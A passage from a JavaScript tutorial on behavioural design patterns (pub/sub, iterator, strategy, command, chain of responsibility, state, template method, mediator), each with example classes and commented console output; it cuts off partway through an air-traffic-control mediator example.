    if (!this.subscribers[event]) {
      this.subscribers[event] = {};
    }
    
    const token = `sub_${this.subId++}`;
    this.subscribers[event][token] = callback;
    
    // Return unsubscribe function
    return () => this.unsubscribe(token);
  }
  
  unsubscribe(token) {
    for (const event in this.subscribers) {
      if (this.subscribers[event][token]) {
        delete this.subscribers[event][token];
        return true;
      }
    }
    return false;
  }
  
  publish(event, data) {
    if (!this.subscribers[event]) return;
    
    Object.values(this.subscribers[event]).forEach(callback => {
      callback(data);
    });
  }
}

// Usage
const pubsub = new PubSub();

// Subscribe
const unsubscribe1 = pubsub.subscribe('userLoggedIn', (user) => {
  console.log('User logged in:', user.name);
});

const unsubscribe2 = pubsub.subscribe('userLoggedIn', (user) => {
  console.log('Sending welcome email to:', user.email);
});

const unsubscribe3 = pubsub.subscribe('userLoggedOut', (user) => {
  console.log('User logged out:', user.name);
});

// Publish
pubsub.publish('userLoggedIn', { name: 'Alice', email: 'alice@example.com' });
// User logged in: Alice
// Sending welcome email to: alice@example.com

// Unsubscribe
unsubscribe1();

pubsub.publish('userLoggedIn', { name: 'Bob', email: 'bob@example.com' });
// Sending welcome email to: bob@example.com (first subscriber removed)

pubsub.publish('userLoggedOut', { name: 'Alice' });
// User logged out: Alice
```

### Real-World Example: Store

```javascript
class Store {
  constructor(initialState = {}) {
    this.state = initialState;
    this.listeners = [];
  }
  
  getState() {
    return { ...this.state };
  }
  
  setState(newState) {
    const prevState = this.state;
    this.state = { ...this.state, ...newState };
    this.notify({ prevState, state: this.state });
  }
  
  subscribe(listener) {
    this.listeners.push(listener);
    
    // Return unsubscribe function
    return () => {
      this.listeners = this.listeners.filter(l => l !== listener);
    };
  }
  
  notify(update) {
    this.listeners.forEach(listener => listener(update));
  }
}

// Usage
const store = new Store({ count: 0, user: null });

const unsubscribe1 = store.subscribe(({ prevState, state }) => {
  console.log('Store updated:');
  console.log('  Previous:', prevState);
  console.log('  Current:', state);
});

const unsubscribe2 = store.subscribe(({ state }) => {
  if (state.count !== undefined) {
    console.log(`Count is now: ${state.count}`);
  }
});

store.setState({ count: 1 });
// Store updated:
//   Previous: { count: 0, user: null }
//   Current: { count: 1, user: null }
// Count is now: 1

store.setState({ user: { name: 'Alice' } });
// Store updated:
//   Previous: { count: 1, user: null }
//   Current: { count: 1, user: { name: 'Alice' } }

unsubscribe1();
store.setState({ count: 2 });
// Count is now: 2 (first subscriber removed)
```

---

## Iterator Pattern

The Iterator Pattern provides a way to access elements of a collection sequentially without exposing its underlying representation.

### Basic Iterator

```javascript
class ArrayIterator {
  constructor(array) {
    this.array = array;
    this.index = 0;
  }
  
  hasNext() {
    return this.index < this.array.length;
  }
  
  next() {
    if (!this.hasNext()) {
      throw new Error('No more elements');
    }
    return this.array[this.index++];
  }
  
  reset() {
    this.index = 0;
  }
}

// Usage
const iterator = new ArrayIterator([1, 2, 3, 4, 5]);

while (iterator.hasNext()) {
  console.log(iterator.next());
}
// 1, 2, 3, 4, 5

iterator.reset();
console.log(iterator.next()); // 1
```

### ES6 Iterator Protocol

```javascript
class Range {
  constructor(start, end, step = 1) {
    this.start = start;
    this.end = end;
    this.step = step;
  }
  
  [Symbol.iterator]() {
    let current = this.start;
    const end = this.end;
    const step = this.step;
    
    return {
      next() {
        if (current <= end) {
          const value = current;
          current += step;
          return { value, done: false };
        }
        return { done: true };
      }
    };
  }
}

// Usage
const range = new Range(1, 10, 2);

for (const num of range) {
  console.log(num); // 1, 3, 5, 7, 9
}

// Can be spread
console.log([...range]); // [1, 3, 5, 7, 9]

// Can use Array.from
console.log(Array.from(range)); // [1, 3, 5, 7, 9]
```

### Generator Iterator

```javascript
class Collection {
  constructor() {
    this.items = [];
  }
  
  add(item) {
    this.items.push(item);
  }
  
  // Forward iterator
  *[Symbol.iterator]() {
    for (const item of this.items) {
      yield item;
    }
  }
  
  // Reverse iterator
  *reverse() {
    for (let i = this.items.length - 1; i >= 0; i--) {
      yield this.items[i];
    }
  }
  
  // Filter iterator
  *filter(predicate) {
    for (const item of this.items) {
      if (predicate(item)) {
        yield item;
      }
    }
  }
  
  // Map iterator
  *map(transformer) {
    for (const item of this.items) {
      yield transformer(item);
    }
  }
}

// Usage
const collection = new Collection();
collection.add(1);
collection.add(2);
collection.add(3);
collection.add(4);
collection.add(5);

// Forward iteration
console.log('Forward:', [...collection]); // [1, 2, 3, 4, 5]

// Reverse iteration
console.log('Reverse:', [...collection.reverse()]); // [5, 4, 3, 2, 1]

// Filter
console.log('Even:', [...collection.filter(x => x % 2 === 0)]); // [2, 4]

// Map
console.log('Squared:', [...collection.map(x => x * x)]); // [1, 4, 9, 16, 25]
```

### Tree Iterator

```javascript
class TreeNode {
  constructor(value) {
    this.value = value;
    this.children = [];
  }
  
  addChild(child) {
    this.children.push(child);
  }
  
  // Depth-first traversal
  *depthFirst() {
    yield this.value;
    for (const child of this.children) {
      yield* child.depthFirst();
    }
  }
  
  // Breadth-first traversal
  *breadthFirst() {
    const queue = [this];
    
    while (queue.length > 0) {
      const node = queue.shift();
      yield node.value;
      queue.push(...node.children);
    }
  }
}

// Usage
const root = new TreeNode(1);
const child1 = new TreeNode(2);
const child2 = new TreeNode(3);
const child3 = new TreeNode(4);
const child4 = new TreeNode(5);
const child5 = new TreeNode(6);

root.addChild(child1);
root.addChild(child2);
child1.addChild(child3);
child1.addChild(child4);
child2.addChild(child5);

/*
    1
   / \
  2   3
 / \   \
4   5   6
*/

console.log('Depth-first:', [...root.depthFirst()]);
// [1, 2, 4, 5, 3, 6]

console.log('Breadth-first:', [...root.breadthFirst()]);
// [1, 2, 3, 4, 5, 6]
```

---

## Strategy Pattern

The Strategy Pattern defines a family of algorithms, encapsulates each one, and makes them interchangeable.

### Basic Strategy

```javascript
// Strategy interface
class PaymentStrategy {
  pay(amount) {
    throw new Error('pay method must be implemented');
  }
}

// Concrete strategies
class CreditCardStrategy extends PaymentStrategy {
  constructor(cardNumber, cvv) {
    super();
    this.cardNumber = cardNumber;
    this.cvv = cvv;
  }
  
  pay(amount) {
    console.log(`Paid $${amount} using Credit Card ${this.cardNumber}`);
    return { success: true, method: 'credit_card' };
  }
}

class PayPalStrategy extends PaymentStrategy {
  constructor(email) {
    super();
    this.email = email;
  }
  
  pay(amount) {
    console.log(`Paid $${amount} using PayPal account ${this.email}`);
    return { success: true, method: 'paypal' };
  }
}

class CryptoStrategy extends PaymentStrategy {
  constructor(walletAddress) {
    super();
    this.walletAddress = walletAddress;
  }
  
  pay(amount) {
    console.log(`Paid $${amount} using Crypto wallet ${this.walletAddress}`);
    return { success: true, method: 'crypto' };
  }
}

// Context
class ShoppingCart {
  constructor() {
    this.items = [];
    this.paymentStrategy = null;
  }
  
  addItem(item) {
    this.items.push(item);
  }
  
  setPaymentStrategy(strategy) {
    this.paymentStrategy = strategy;
  }
  
  getTotal() {
    return this.items.reduce((sum, item) => sum + item.price, 0);
  }
  
  checkout() {
    if (!this.paymentStrategy) {
      throw new Error('Payment strategy not set');
    }
    
    const total = this.getTotal();
    return this.paymentStrategy.pay(total);
  }
}

// Usage
const cart = new ShoppingCart();
cart.addItem({ name: 'Book', price: 10 });
cart.addItem({ name: 'Pen', price: 2 });

// Pay with credit card
cart.setPaymentStrategy(new CreditCardStrategy('1234-5678-9012-3456', '123'));
cart.checkout(); // Paid $12 using Credit Card...

// Pay with PayPal
cart.setPaymentStrategy(new PayPalStrategy('user@example.com'));
cart.checkout(); // Paid $12 using PayPal...
```

### Validation Strategy

```javascript
class Validator {
  constructor() {
    this.strategies = [];
  }
  
  addStrategy(strategy) {
    this.strategies.push(strategy);
    return this;
  }
  
  validate(data) {
    const errors = [];
    
    for (const strategy of this.strategies) {
      const error = strategy.validate(data);
      if (error) {
        errors.push(error);
      }
    }
    
    return {
      isValid: errors.length === 0,
      errors
    };
  }
}

// Validation strategies
class RequiredStrategy {
  constructor(field) {
    this.field = field;
  }
  
  validate(data) {
    if (!data[this.field] || data[this.field].trim() === '') {
      return `${this.field} is required`;
    }
    return null;
  }
}

class EmailStrategy {
  constructor(field) {
    this.field = field;
  }
  
  validate(data) {
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (!emailRegex.test(data[this.field])) {
      return `${this.field} must be a valid email`;
    }
    return null;
  }
}

class MinLengthStrategy {
  constructor(field, minLength) {
    this.field = field;
    this.minLength = minLength;
  }
  
  validate(data) {
    if (data[this.field] && data[this.field].length < this.minLength) {
      return `${this.field} must be at least ${this.minLength} characters`;
    }
    return null;
  }
}

class RangeStrategy {
  constructor(field, min, max) {
    this.field = field;
    this.min = min;
    this.max = max;
  }
  
  validate(data) {
    const value = data[this.field];
    if (value < this.min || value > this.max) {
      return `${this.field} must be between ${this.min} and ${this.max}`;
    }
    return null;
  }
}

// Usage
const validator = new Validator();
validator
  .addStrategy(new RequiredStrategy('username'))
  .addStrategy(new MinLengthStrategy('username', 3))
  .addStrategy(new RequiredStrategy('email'))
  .addStrategy(new EmailStrategy('email'))
  .addStrategy(new RequiredStrategy('age'))
  .addStrategy(new RangeStrategy('age', 18, 100));

const result1 = validator.validate({
  username: 'ab',
  email: 'invalid-email',
  age: 15
});

console.log(result1);
// { isValid: false, errors: [...] }

const result2 = validator.validate({
  username: 'alice',
  email: 'alice@example.com',
  age: 25
});

console.log(result2);
// { isValid: true, errors: [] }
```

### Sorting Strategy

```javascript
class Sorter {
  constructor(strategy) {
    this.strategy = strategy;
  }
  
  setStrategy(strategy) {
    this.strategy = strategy;
  }
  
  sort(data) {
    return this.strategy.sort([...data]);
  }
}

// Sorting strategies
class BubbleSortStrategy {
  sort(data) {
    console.log('Using Bubble Sort');
    const arr = [...data];
    const n = arr.length;
    
    for (let i = 0; i < n - 1; i++) {
      for (let j = 0; j < n - i - 1; j++) {
        if (arr[j] > arr[j + 1]) {
          [arr[j], arr[j + 1]] = [arr[j + 1], arr[j]];
        }
      }
    }
    
    return arr;
  }
}

class QuickSortStrategy {
  sort(data) {
    console.log('Using Quick Sort');
    return this.quickSort([...data]);
  }
  
  quickSort(arr) {
    if (arr.length <= 1) return arr;
    
    const pivot = arr[Math.floor(arr.length / 2)];
    const left = arr.filter(x => x < pivot);
    const middle = arr.filter(x => x === pivot);
    const right = arr.filter(x => x > pivot);
    
    return [...this.quickSort(left), ...middle, ...this.quickSort(right)];
  }
}

class NativeSortStrategy {
  sort(data) {
    console.log('Using Native Sort');
    return [...data].sort((a, b) => a - b);
  }
}

// Usage
const data = [64, 34, 25, 12, 22, 11, 90];
const sorter = new Sorter(new BubbleSortStrategy());

console.log(sorter.sort(data)); // Using Bubble Sort

sorter.setStrategy(new QuickSortStrategy());
console.log(sorter.sort(data)); // Using Quick Sort

sorter.setStrategy(new NativeSortStrategy());
console.log(sorter.sort(data)); // Using Native Sort
```

---

## Command Pattern

The Command Pattern encapsulates a request as an object, allowing you to parameterize clients with different requests, queue or log requests, and support undoable operations.

### Basic Command

```javascript
// Receiver
class Light {
  turnOn() {
    console.log('Light is ON');
  }
  
  turnOff() {
    console.log('Light is OFF');
  }
}

// Command interface
class Command {
  execute() {
    throw new Error('execute must be implemented');
  }
  
  undo() {
    throw new Error('undo must be implemented');
  }
}

// Concrete commands
class TurnOnCommand extends Command {
  constructor(light) {
    super();
    this.light = light;
  }
  
  execute() {
    this.light.turnOn();
  }
  
  undo() {
    this.light.turnOff();
  }
}

class TurnOffCommand extends Command {
  constructor(light) {
    super();
    this.light = light;
  }
  
  execute() {
    this.light.turnOff();
  }
  
  undo() {
    this.light.turnOn();
  }
}

// Invoker
class RemoteControl {
  constructor() {
    this.history = [];
  }
  
  execute(command) {
    command.execute();
    this.history.push(command);
  }
  
  undo() {
    const command = this.history.pop();
    if (command) {
      command.undo();
    }
  }
}

// Usage
const light = new Light();
const remote = new RemoteControl();

const turnOn = new TurnOnCommand(light);
const turnOff = new TurnOffCommand(light);

remote.execute(turnOn);  // Light is ON
remote.execute(turnOff); // Light is OFF
remote.undo();           // Light is ON
remote.undo();           // Light is OFF
```

### Text Editor with Undo/Redo

```javascript
class TextEditor {
  constructor() {
    this.content = '';
  }
  
  getContent() {
    return this.content;
  }
  
  setContent(content) {
    this.content = content;
  }
  
  insert(text, position) {
    this.content = 
      this.content.slice(0, position) + 
      text + 
      this.content.slice(position);
  }
  
  delete(start, length) {
    this.content = 
      this.content.slice(0, start) + 
      this.content.slice(start + length);
  }
}

// Commands
class InsertCommand {
  constructor(editor, text, position) {
    this.editor = editor;
    this.text = text;
    this.position = position;
  }
  
  execute() {
    this.editor.insert(this.text, this.position);
  }
  
  undo() {
    this.editor.delete(this.position, this.text.length);
  }
}

class DeleteCommand {
  constructor(editor, start, length) {
    this.editor = editor;
    this.start = start;
    this.length = length;
    this.deletedText = '';
  }
  
  execute() {
    this.deletedText = this.editor.getContent()
      .slice(this.start, this.start + this.length);
    this.editor.delete(this.start, this.length);
  }
  
  undo() {
    this.editor.insert(this.deletedText, this.start);
  }
}

// Command Manager with Undo/Redo
class CommandManager {
  constructor() {
    this.history = [];
    this.currentIndex = -1;
  }
  
  execute(command) {
    // Remove any commands after current index
    this.history = this.history.slice(0, this.currentIndex + 1);
    
    command.execute();
    this.history.push(command);
    this.currentIndex++;
  }
  
  undo() {
    if (this.currentIndex >= 0) {
      this.history[this.currentIndex].undo();
      this.currentIndex--;
    }
  }
  
  redo() {
    if (this.currentIndex < this.history.length - 1) {
      this.currentIndex++;
      this.history[this.currentIndex].execute();
    }
  }
  
  canUndo() {
    return this.currentIndex >= 0;
  }
  
  canRedo() {
    return this.currentIndex < this.history.length - 1;
  }
}

// Usage
const editor = new TextEditor();
const manager = new CommandManager();

manager.execute(new InsertCommand(editor, 'Hello', 0));
console.log(editor.getContent()); // "Hello"

manager.execute(new InsertCommand(editor, ' World', 5));
console.log(editor.getContent()); // "Hello World"

manager.execute(new DeleteCommand(editor, 5, 6));
console.log(editor.getContent()); // "Hello"

manager.undo();
console.log(editor.getContent()); // "Hello World"

manager.undo();
console.log(editor.getContent()); // "Hello"

manager.redo();
console.log(editor.getContent()); // "Hello World"
```

### Macro Command

```javascript
class MacroCommand {
  constructor() {
    this.commands = [];
  }
  
  add(command) {
    this.commands.push(command);
    return this;
  }
  
  execute() {
    this.commands.forEach(command => command.execute());
  }
  
  undo() {
    // Undo in reverse order
    for (let i = this.commands.length - 1; i >= 0; i--) {
      this.commands[i].undo();
    }
  }
}

// Usage
const light1 = new Light();
const light2 = new Light();
const light3 = new Light();

const allLightsOn = new MacroCommand();
allLightsOn
  .add(new TurnOnCommand(light1))
  .add(new TurnOnCommand(light2))
  .add(new TurnOnCommand(light3));

const remote = new RemoteControl();
remote.execute(allLightsOn);
// Light is ON (x3)

remote.undo();
// Light is OFF (x3)
```

---

## Chain of Responsibility

The Chain of Responsibility Pattern passes a request along a chain of handlers. Each handler decides either to process the request or pass it to the next handler.

### Basic Chain

```javascript
class Handler {
  constructor() {
    this.nextHandler = null;
  }
  
  setNext(handler) {
    this.nextHandler = handler;
    return handler; // Enable chaining
  }
  
  handle(request) {
    if (this.nextHandler) {
      return this.nextHandler.handle(request);
    }
    return null;
  }
}

// Concrete handlers
class AuthenticationHandler extends Handler {
  handle(request) {
    if (!request.authenticated) {
      console.log('Authentication failed');
      return { error: 'Not authenticated' };
    }
    console.log('Authentication passed');
    return super.handle(request);
  }
}

class AuthorizationHandler extends Handler {
  handle(request) {
    if (!request.authorized) {
      console.log('Authorization failed');
      return { error: 'Not authorized' };
    }
    console.log('Authorization passed');
    return super.handle(request);
  }
}

class ValidationHandler extends Handler {
  handle(request) {
    if (!request.data || !request.data.name) {
      console.log('Validation failed');
      return { error: 'Invalid data' };
    }
    console.log('Validation passed');
    return super.handle(request);
  }
}

class ProcessHandler extends Handler {
  handle(request) {
    console.log('Processing request:', request.data);
    return { success: true, data: request.data };
  }
}

// Usage
const auth = new AuthenticationHandler();
const authz = new AuthorizationHandler();
const validation = new ValidationHandler();
const process = new ProcessHandler();

auth.setNext(authz).setNext(validation).setNext(process);

// Test 1: Full request
const result1 = auth.handle({
  authenticated: true,
  authorized: true,
  data: { name: 'Alice' }
});
console.log('Result:', result1);
// Authentication passed
// Authorization passed
// Validation passed
// Processing request: { name: 'Alice' }
// Result: { success: true, data: { name: 'Alice' } }

// Test 2: Not authenticated
const result2 = auth.handle({
  authenticated: false,
  authorized: true,
  data: { name: 'Bob' }
});
console.log('Result:', result2);
// Authentication failed
// Result: { error: 'Not authenticated' }
```

### Middleware Chain

```javascript
class MiddlewareChain {
  constructor() {
    this.middlewares = [];
  }
  
  use(middleware) {
    this.middlewares.push(middleware);
    return this;
  }
  
  async execute(context) {
    let index = 0;
    
    const next = async () => {
      if (index < this.middlewares.length) {
        const middleware = this.middlewares[index++];
        await middleware(context, next);
      }
    };
    
    await next();
  }
}

// Middleware functions
async function loggingMiddleware(context, next) {
  console.log(`[LOG] ${context.method} ${context.url}`);
  await next();
}

async function authMiddleware(context, next) {
  if (!context.headers.authorization) {
    context.status = 401;
    context.body = 'Unauthorized';
    return;
  }
  console.log('[AUTH] User authenticated');
  await next();
}

async function timingMiddleware(context, next) {
  const start = Date.now();
  await next();
  const duration = Date.now() - start;
  console.log(`[TIMING] Request took ${duration}ms`);
}

async function responseMiddleware(context, next) {
  await next();
  context.body = context.body || 'Success';
  console.log(`[RESPONSE] ${context.status || 200} - ${context.body}`);
}

// Usage
const chain = new MiddlewareChain();
chain
  .use(loggingMiddleware)
  .use(timingMiddleware)
  .use(authMiddleware)
  .use(responseMiddleware);

const context = {
  method: 'GET',
  url: '/api/users',
  headers: { authorization: 'Bearer token123' }
};

chain.execute(context);
// [LOG] GET /api/users
// [AUTH] User authenticated
// [RESPONSE] 200 - Success
// [TIMING] Request took 2ms
```

### Support Ticket System

```javascript
class SupportHandler {
  constructor(level, name) {
    this.level = level;
    this.name = name;
    this.nextHandler = null;
  }
  
  setNext(handler) {
    this.nextHandler = handler;
    return handler;
  }
  
  handle(ticket) {
    if (ticket.priority <= this.level) {
      console.log(`${this.name} handling ticket: ${ticket.description}`);
      return true;
    }
    
    if (this.nextHandler) {
      console.log(`${this.name} escalating to next level`);
      return this.nextHandler.handle(ticket);
    }
    
    console.log('No handler available for this priority');
    return false;
  }
}

// Usage
const juniorSupport = new SupportHandler(1, 'Junior Support');
const seniorSupport = new SupportHandler(2, 'Senior Support');
const manager = new SupportHandler(3, 'Manager');
const director = new SupportHandler(4, 'Director');

juniorSupport
  .setNext(seniorSupport)
  .setNext(manager)
  .setNext(director);

// Test tickets
juniorSupport.handle({ priority: 1, description: 'Password reset' });
// Junior Support handling ticket: Password reset

juniorSupport.handle({ priority: 2, description: 'Account locked' });
// Junior Support escalating to next level
// Senior Support handling ticket: Account locked

juniorSupport.handle({ priority: 4, description: 'System outage' });
// Junior Support escalating to next level
// Senior Support escalating to next level
// Manager escalating to next level
// Director handling ticket: System outage
```

---

## State Pattern

The State Pattern allows an object to alter its behavior when its internal state changes.

### Basic State

```javascript
// State interface
class State {
  handle(context) {
    throw new Error('handle must be implemented');
  }
}

// Concrete states
class RedState extends State {
  handle(context) {
    console.log('Red Light - STOP');
    context.setState(new GreenState());
  }
}

class YellowState extends State {
  handle(context) {
    console.log('Yellow Light - CAUTION');
    context.setState(new RedState());
  }
}

class GreenState extends State {
  handle(context) {
    console.log('Green Light - GO');
    context.setState(new YellowState());
  }
}

// Context
class TrafficLight {
  constructor() {
    this.state = new RedState();
  }
  
  setState(state) {
    this.state = state;
  }
  
  change() {
    this.state.handle(this);
  }
}

// Usage
const light = new TrafficLight();
light.change(); // Red Light - STOP
light.change(); // Green Light - GO
light.change(); // Yellow Light - CAUTION
light.change(); // Red Light - STOP
```

### Document State Machine

```javascript
class Document {
  constructor() {
    this.content = '';
    this.state = new DraftState();
  }
  
  setState(state) {
    this.state = state;
    console.log(`State changed to: ${state.constructor.name}`);
  }
  
  publish() {
    this.state.publish(this);
  }
  
  review() {
    this.state.review(this);
  }
  
  approve() {
    this.state.approve(this);
  }
  
  reject() {
    this.state.reject(this);
  }
}

class DocumentState {
  publish(document) {
    console.log('Cannot publish in this state');
  }
  
  review(document) {
    console.log('Cannot review in this state');
  }
  
  approve(document) {
    console.log('Cannot approve in this state');
  }
  
  reject(document) {
    console.log('Cannot reject in this state');
  }
}

class DraftState extends DocumentState {
  review(document) {
    console.log('Submitting for review...');
    document.setState(new ReviewState());
  }
}

class ReviewState extends DocumentState {
  approve(document) {
    console.log('Approving document...');
    document.setState(new ApprovedState());
  }
  
  reject(document) {
    console.log('Rejecting document...');
    document.setState(new DraftState());
  }
}

class ApprovedState extends DocumentState {
  publish(document) {
    console.log('Publishing document...');
    document.setState(new PublishedState());
  }
}

class PublishedState extends DocumentState {
  // Published is final state
}

// Usage
const doc = new Document();

doc.review();   // Submitting for review...
doc.approve();  // Approving document...
doc.publish();  // Publishing document...
doc.review();   // Cannot review in this state
```

### Vending Machine

```javascript
class VendingMachine {
  constructor(inventory) {
    this.inventory = inventory;
    this.currentItem = null;
    this.currentMoney = 0;
    this.state = new ReadyState();
  }
  
  setState(state) {
    this.state = state;
  }
  
  selectItem(item) {
    this.state.selectItem(this, item);
  }
  
  insertMoney(amount) {
    this.state.insertMoney(this, amount);
  }
  
  dispense() {
    this.state.dispense(this);
  }
  
  cancel() {
    this.state.cancel(this);
  }
}

class VendingMachineState {
  selectItem(machine, item) {
    console.log('Invalid operation in this state');
  }
  
  insertMoney(machine, amount) {
    console.log('Invalid operation in this state');
  }
  
  dispense(machine) {
    console.log('Invalid operation in this state');
  }
  
  cancel(machine) {
    console.log('Invalid operation in this state');
  }
}

class ReadyState extends VendingMachineState {
  selectItem(machine, item) {
    if (machine.inventory[item] > 0) {
      console.log(`Selected: ${item}`);
      machine.currentItem = item;
      machine.setState(new ItemSelectedState());
    } else {
      console.log(`${item} is out of stock`);
    }
  }
}

class ItemSelectedState extends VendingMachineState {
  insertMoney(machine, amount) {
    machine.currentMoney += amount;
    console.log(`Inserted $${amount}. Total: $${machine.currentMoney}`);
    
    const itemPrice = 2.50; // Simplified pricing
    
    if (machine.currentMoney >= itemPrice) {
      machine.setState(new DispensingState());
      machine.dispense();
    }
  }
  
  cancel(machine) {
    console.log(`Cancelled. Refunding $${machine.currentMoney}`);
    machine.currentMoney = 0;
    machine.currentItem = null;
    machine.setState(new ReadyState());
  }
}

class DispensingState extends VendingMachineState {
  dispense(machine) {
    console.log(`Dispensing ${machine.currentItem}`);
    machine.inventory[machine.currentItem]--;
    
    const itemPrice = 2.50;
    const change = machine.currentMoney - itemPrice;
    
    if (change > 0) {
      console.log(`Change: $${change.toFixed(2)}`);
    }
    
    machine.currentMoney = 0;
    machine.currentItem = null;
    machine.setState(new ReadyState());
  }
}

// Usage
const machine = new VendingMachine({
  'Coke': 5,
  'Pepsi': 3,
  'Water': 10
});

machine.selectItem('Coke');
machine.insertMoney(1.00);
machine.insertMoney(1.00);
machine.insertMoney(1.00);
// Selected: Coke
// Inserted $1. Total: $1
// Inserted $1. Total: $2
// Inserted $1. Total: $3
// Dispensing Coke
// Change: $0.50
```

---

## Template Method Pattern

The Template Method Pattern defines the skeleton of an algorithm, letting subclasses override specific steps without changing the algorithm's structure.

### Basic Template Method

```javascript
class DataProcessor {
  // Template method
  process() {
    this.loadData();
    this.validateData();
    this.processData();
    this.saveData();
  }
  
  loadData() {
    throw new Error('loadData must be implemented');
  }
  
  validateData() {
    console.log('Validating data...');
  }
  
  processData() {
    throw new Error('processData must be implemented');
  }
  
  saveData() {
    console.log('Saving data...');
  }
}

// Concrete implementations
class CSVProcessor extends DataProcessor {
  loadData() {
    console.log('Loading CSV file...');
    this.data = 'csv,data,here';
  }
  
  processData() {
    console.log('Processing CSV data...');
    this.result = this.data.split(',');
  }
}

class JSONProcessor extends DataProcessor {
  loadData() {
    console.log('Loading JSON file...');
    this.data = '{"name":"Alice"}';
  }
  
  processData() {
    console.log('Processing JSON data...');
    this.result = JSON.parse(this.data);
  }
}

// Usage
const csvProcessor = new CSVProcessor();
csvProcessor.process();
// Loading CSV file...
// Validating data...
// Processing CSV data...
// Saving data...

const jsonProcessor = new JSONProcessor();
jsonProcessor.process();
// Loading JSON file...
// Validating data...
// Processing JSON data...
// Saving data...
```

### Game Template

```javascript
class Game {
  // Template method
  play() {
    this.initialize();
    this.startPlay();
    this.endPlay();
  }
  
  initialize() {
    console.log('Game initialized');
  }
  
  startPlay() {
    throw new Error('startPlay must be implemented');
  }
  
  endPlay() {
    throw new Error('endPlay must be implemented');
  }
}

class Chess extends Game {
  startPlay() {
    console.log('Chess game started');
    console.log('Moving pieces...');
  }
  
  endPlay() {
    console.log('Chess game ended');
  }
}

class Football extends Game {
  initialize() {
    super.initialize();
    console.log('Setting up field...');
  }
  
  startPlay() {
    console.log('Football game started');
    console.log('Kicking ball...');
  }
  
  endPlay() {
    console.log('Football game ended');
  }
}

// Usage
const chess = new Chess();
chess.play();
// Game initialized
// Chess game started
// Moving pieces...
// Chess game ended

const football = new Football();
football.play();
// Game initialized
// Setting up field...
// Football game started
// Kicking ball...
// Football game ended
```

### Report Generator

```javascript
class ReportGenerator {
  generate() {
    this.fetchData();
    this.formatHeader();
    this.formatBody();
    this.formatFooter();
    return this.output;
  }
  
  fetchData() {
    console.log('Fetching data...');
    this.data = { title: 'Report', items: [1, 2, 3] };
  }
  
  formatHeader() {
    throw new Error('formatHeader must be implemented');
  }
  
  formatBody() {
    throw new Error('formatBody must be implemented');
  }
  
  formatFooter() {
    throw new Error('formatFooter must be implemented');
  }
}

class PDFReport extends ReportGenerator {
  constructor() {
    super();
    this.output = '';
  }
  
  formatHeader() {
    this.output += `PDF Header: ${this.data.title}\n`;
  }
  
  formatBody() {
    this.output += 'PDF Body:\n';
    this.data.items.forEach(item => {
      this.output += `  - Item ${item}\n`;
    });
  }
  
  formatFooter() {
    this.output += 'PDF Footer\n';
  }
}

class HTMLReport extends ReportGenerator {
  constructor() {
    super();
    this.output = '';
  }
  
  formatHeader() {
    this.output += `<h1>${this.data.title}</h1>\n`;
  }
  
  formatBody() {
    this.output += '<ul>\n';
    this.data.items.forEach(item => {
      this.output += `  <li>Item ${item}</li>\n`;
    });
    this.output += '</ul>\n';
  }
  
  formatFooter() {
    this.output += '<footer>End of Report</footer>\n';
  }
}

// Usage
const pdfReport = new PDFReport();
console.log(pdfReport.generate());

const htmlReport = new HTMLReport();
console.log(htmlReport.generate());
```

---

## Mediator Pattern

The Mediator Pattern defines an object that encapsulates how a set of objects interact, promoting loose coupling.

### Basic Mediator

```javascript
class Mediator {
  constructor() {
    this.colleagues = [];
  }
  
  register(colleague) {
    this.colleagues.push(colleague);
    colleague.setMediator(this);
  }
  
  send(message, sender) {
    this.colleagues.forEach(colleague => {
      if (colleague !== sender) {
        colleague.receive(message, sender);
      }
    });
  }
}

class Colleague {
  constructor(name) {
    this.name = name;
    this.mediator = null;
  }
  
  setMediator(mediator) {
    this.mediator = mediator;
  }
  
  send(message) {
    console.log(`${this.name} sends: ${message}`);
    this.mediator.send(message, this);
  }
  
  receive(message, sender) {
    console.log(`${this.name} receives from ${sender.name}: ${message}`);
  }
}

// Usage
const mediator = new Mediator();

const colleague1 = new Colleague('Alice');
const colleague2 = new Colleague('Bob');
const colleague3 = new Colleague('Charlie');

mediator.register(colleague1);
mediator.register(colleague2);
mediator.register(colleague3);

colleague1.send('Hello everyone!');
// Alice sends: Hello everyone!
// Bob receives from Alice: Hello everyone!
// Charlie receives from Alice: Hello everyone!

colleague2.send('Hi Alice!');
// Bob sends: Hi Alice!
// Alice receives from Bob: Hi Alice!
// Charlie receives from Bob: Hi Alice!
```

### Chat Room Mediator

```javascript
class ChatRoom {
  constructor() {
    this.users = new Map();
  }
  
  register(user) {
    this.users.set(user.name, user);
    user.setChatRoom(this);
  }
  
  sendMessage(message, from, to) {
    if (to) {
      // Direct message
      const recipient = this.users.get(to);
      if (recipient) {
        recipient.receive(message, from);
      }
    } else {
      // Broadcast to all except sender
      this.users.forEach(user => {
        if (user.name !== from) {
          user.receive(message, from);
        }
      });
    }
  }
  
  showUsers() {
    console.log('Users in chat:', Array.from(this.users.keys()).join(', '));
  }
}

class User {
  constructor(name) {
    this.name = name;
    this.chatRoom = null;
  }
  
  setChatRoom(chatRoom) {
    this.chatRoom = chatRoom;
  }
  
  send(message, to = null) {
    console.log(`[${this.name}] Sending: ${message}`);
    this.chatRoom.sendMessage(message, this.name, to);
  }
  
  receive(message, from) {
    console.log(`[${this.name}] Received from ${from}: ${message}`);
  }
}

// Usage
const chatRoom = new ChatRoom();

const alice = new User('Alice');
const bob = new User('Bob');
const charlie = new User('Charlie');

chatRoom.register(alice);
chatRoom.register(bob);
chatRoom.register(charlie);

chatRoom.showUsers();

alice.send('Hello everyone!');
// [Alice] Sending: Hello everyone!
// [Bob] Received from Alice: Hello everyone!
// [Charlie] Received from Alice: Hello everyone!

bob.send('Hi Alice!', 'Alice');
// [Bob] Sending: Hi Alice!
// [Alice] Received from Bob: Hi Alice!
```

### Air Traffic Control

```javascript
class ControlTower {
  constructor() {
    this.aircraft = new Map();
  }
  
  register(plane) {
    this.aircraft.set(plane.id, plane);
    plane.setControlTower(this);
    console.log(`${plane.id} registered with control tower`);
  }
  
  requestLanding(plane) {
    console.log(`${plane.id} requests landing`);
    
    // Check if runway is clear
    const isRunwayClear = ![...this.aircraft.values()]
      .some(p => p !== plane && p.status === 'landing');
    
    if (isRunwayClear) {
      plane.receivePermission('Landing approved');
      return true;
    } else {
      plane.receivePermission('Hold position, runway busy');
      return false;
    }
  }
  
  requestTakeoff(plane) {
    console.log(`${plane.id} requests takeoff`);
    plane.receivePermission('Takeoff approved');
  }
  
  reportPosition(plane, position) {
    console.log(`${plane.id} at position ${position}`);
